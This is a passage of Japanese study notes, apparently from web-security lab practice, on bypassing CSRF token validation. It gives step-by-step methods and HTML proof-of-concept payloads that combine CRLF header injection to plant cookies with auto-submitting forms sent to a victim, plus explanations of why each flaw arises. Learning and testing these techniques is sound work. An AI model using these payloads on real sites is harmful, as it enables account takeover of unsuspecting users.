	↓
```http

email=pwned@evil-user.net
```

### リクエストメソッドによってはCSRF token検証がされない

1. Change request methodでメソッドを変更

### CSRF tokenがユーザのセッションと結びついていない

💡CSRFトークンが1度きりのアクションで"Invalid CSRF token"と表示されるようになる場合、可能性高い

1. アクションを実行するリクエストをRepeaterへ
2. ブラウザの==プライベートモード==でウィンドウを開き、攻撃者の侵害しているアカウントでログイン。以下の方法で、有効かつ未使用のCSRF tokenを入手する
	- InterceptをONにし、プライベートモードのウィンドウでアクションを実行
	- 傍受したリクエストのcsrf tokenをメモし、リクエストはDropする

3. ステップ2で入手したcsrf tokenでステップ1のcsrf tokenを上書きしてsend。アクションが実行できることを確認する
4. 再度、ステップ2で有効かつ未使用のCSRF tokenを入手し、ステップ1のcsrf tokenを上書きする
5. ステップ4のリクエストでCSRFペイロード生成し、エクスプロイトサーバにホストして被害者にDeliver
- パスワードのリセットへ...

### CSRF tokenがsession Cookieと結びついていない

1. ==ログインしていない状態で==、search機能などに入力した値がLastSearchTermなどのCookieに設定されていることを確認する(ヘッダ注入が可能になる条件)
![[Pasted image 20240208170105.png]]

2. ログイン後、Cookieに`session`と`csrfKey`の2つがあることを確認
	- POSTリクエストの`csrf token`は`csrfKey`と結びついている

3. 新たにブラウザの==プライベートモード==でウィンドウを開き、攻撃者の侵害しているアカウントでログイン。有効な`csrfKey`cookieと`csrf token`を発行する

4. 被害者のsession Cookieはそのまま。攻撃者の`csrf token`と`csrfKey`Cookieを上書き。アクションが成功することを確認する
	- session cookieは被害者のもの。csrf tokenとcsrf cookieは攻撃者のものという状況

5. 該当リクエストで、CSRF ペイロードの作成
6. `<script>document.forms...</script>`を削除し、以下の`<img~>` を注入する
```html
...
	<input type="hidden" name="csrf" value="[攻撃者のcsrf token]"/>
	<imput type="submit" value="Submit request" />
</form>
<img src="https://TARGET_NET/?search=any%0d%0aSet-Cookie: [csrfKey]=[攻撃者のcsrfKey値]; SameSite=None" onerror="document.forms[0].submit()">
```
- ↑ヘッダ注入している
###### 基本原理

- tokenがセッション管理用のcookie(`session`)と結びついていない。
- 通常はCSRF tokenとセッション管理用のcookieを結びつけ、どちらか一方が欠けたり、一致しない場合はエラーを起こす
- アプリケーションが2つの異なるフレームワークを使用し、1つはセッション管理用、もう1つはCSRFプロテクション用であり、開発者側でフレームワークが統合できていない場合に起きる
- ↓例: csrf tokenとcookieのcsrfKeyが結びつき、sessionとは結びついていない
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
```

### CSRF tokenがそのままcookieに設定される

- [2. CSRF token検証のバイパス](2.%20CSRF%20token検証のバイパス.md#CSRF%20tokenがsession%20Cookieと結びついていない)の派生

1. Cookieが複数設定されていることを確認し、CSRF tokenがCookieに埋め込まれていることを確認する
2. update emailなどのアクション実行POSTリクエストでGenerate CSRF PoCし、CSRF tokenが設定されているCookieに適当なトークンを設定する。
```html
<html>
  <body>
    <form action="https://TARGET_NET/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="hoge&#64;hoge" />
      <input type="hidden" name="[csrf tokenが設定されているcookie名]" value="FAKE_TOKEN" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="http://TARGET_NET/?search=any%0d%0aSet-Cookie:[csrf tokenが設定されているcookie名]=FAKE_TOKEN; SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
```
3. エクスプロイトサーバにホストし被害者にDeliver

###### なぜこのような欠陥が起きるのか

- サーバ側で発行したcsrf tokenを保持できないとき
- 代わりにtokenをCookieとリクエストパラメタに複製する
- サーバはCookieとリクエストパラメタの値を比較して一致していたらアクションを許可する
- 一種のCSRF対策で、*double submit*防御と呼ばれる。
- 実装が簡単で、サーバサイドでステート管理する必要がない。(非推奨)
```http
POST /email/change HTTP/1.1
Host: vulnerable-website.com
...
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=abc123

csrf=abc123&email=wiener@normal-user.com
```
